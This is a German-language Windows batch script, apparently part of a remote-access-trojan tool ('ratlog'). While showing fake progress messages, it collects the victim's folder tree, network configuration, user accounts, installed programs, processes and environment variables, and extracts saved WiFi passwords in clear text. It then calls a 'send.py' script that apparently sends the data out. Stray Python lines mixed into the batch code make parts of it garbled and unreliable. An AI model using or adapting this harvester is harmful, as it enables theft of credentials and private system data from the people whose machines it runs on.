@echo off
setlocal

color 0

now = datetime.now().astimezone(ZoneInfo('Europe/Berlin'))
hour = now.hour
day = now.day
month = now.month
currentTime = int(time.strftime('%H'))

for /f "tokens=1-5 delims=.:/ " %%d in ("%date% %time%") do (
    set datetime=%%d-%%e-%%f
)
set log_file=ratlog_%USERNAME%.txt

echo Sammeln von Client-Daten...

echo Ordnerbaum: >> %log_file%
tree /A /F >> %log_file%

cls
echo Ordnerbaum wird erfasst. (1/5)
ping 127.0.0.1 -n 2 > nul
tree 
ping 127.0.0.1 -n 2 > nul
cls
cls
echo Ordnerbaum wird erfasst.. (1/5)
ping 127.0.0.1 -n 2 > nul
cls
echo Ordnerbaum wird erfasst... (1/5)
ping 127.0.0.1 -n 2 > nul
cls
echo Ordnerbaum erfasst (1/5)
echo.

echo. >> %log_file%
echo Netzwerkinformationen: >> %log_file%
ipconfig /all >> %log_file%

cls
echo Netzwerkinformationen werden erfasst. (2/5)
ping 127.0.0.1 -n 1 > nul
cls
echo Netzwerkinformationen werden erfasst.. (2/5)
ping 127.0.0.1 -n 1 > nul
cls
echo Netzwerkinformationen werden erfasst... (2/5)
ping 127.0.0.1 -n 1 > nul
echo Netzwerkinformationen  erfasst (2/5)
echo.

echo. >> %log_file%
echo Benutzerinformationen: >> %log_file%
net user >> %log_file%

cls
echo Benutzerinformationen werden erfasst (3/5)
cls
echo Benutzerinformationen erfasst (3/5)
echo.

echo. >> %log_file%
echo Installierte Programme: >> %log_file%
wmic product get name,version >> %log_file%

cls
echo Programme werden erfasst (4/5)
cls
echo Programme erfasst (4/5)
echo.

echo. >> %log_file%
echo Laufende Prozesse: >> %log_file%
tasklist >> %log_file%

cls
echo Laufende Prozesse werden erfasst (5/5)
cls
echo Laufende Prozesse erfasst (5/5)
echo.
python send.py

echo. >> %log_file%
echo Umgebungsvariablen: >> %log_file%
set >> %log_file%

echo. >> %log_file%
echo WLAN-Profile und Passwörter: >> %log_file%
netsh wlan show profiles >> %log_file%
for /f "skip=9 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do (
    set profile=%%i
    call :get_wifi_password "%%i" >> %log_file%
)

echo Daten wurden in %log_file% gesammelt.
pause
goto :eof

:get_wifi_password
for /f "tokens=2 delims=:" %%i in ('netsh wlan show profile name^=%~1 key^=clear ^| findstr /c:"Schlüsselinhalt"') do echo %%i
goto :eof

endlocal